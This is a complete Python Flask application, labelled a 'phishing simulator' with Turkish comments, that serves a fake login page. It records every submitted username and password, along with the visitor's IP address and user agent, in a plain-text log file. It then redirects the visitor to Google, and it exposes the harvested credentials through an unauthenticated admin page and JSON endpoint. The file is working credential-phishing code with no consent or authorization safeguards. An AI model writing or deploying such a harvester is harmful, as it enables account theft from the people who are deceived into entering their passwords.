from flask import Flask, render_template, request, redirect, jsonify
from datetime import datetime
import os
import json

app = Flask(__name__)

LOG_FILE = 'logs/credentials.txt'
os.makedirs('logs', exist_ok=True)

def log_credentials(username, password, ip, user_agent):
    """Girilen bilgileri logla"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = {
        'timestamp': timestamp,
        'ip': ip,
        'user_agent': user_agent,
        'username': username,
        'password': password
    }
    
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(json.dumps(log_entry, ensure_ascii=False) + '\n')

@app.route('/')
def index():
    """Sahte login sayfası"""
    return render_template('fake_login.html')

@app.route('/login', methods=['POST'])
def login():
    """Login formundan gelen verileri işle"""
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')
    
    log_credentials(username, password, ip, user_agent)
    
    return redirect('https://www.google.com')

@app.route('/admin')
def admin():
    """Admin paneli - logları görüntüle"""
    return render_template('admin.html')

@app.route('/api/logs')
def get_logs():
    """Logları JSON olarak döndür"""
    logs = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                try:
                    logs.append(json.loads(line.strip()))
                except json.JSONDecodeError:
                    continue
    return jsonify(logs[::-1])  

@app.route('/api/clear-logs', methods=['POST'])
def clear_logs():
    """Logları temizle"""
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
    return jsonify({'status': 'success'})

if __name__ == '__main__':
    print("=" * 50)
    print("PHISHING SIMULATOR")
    print("=" * 50)
    print("\nSahte Login: http://localhost:5000")
    print("Admin Panel: http://localhost:5000/admin")
    
    app.run(debug=True, host='0.0.0.0', port=5000)
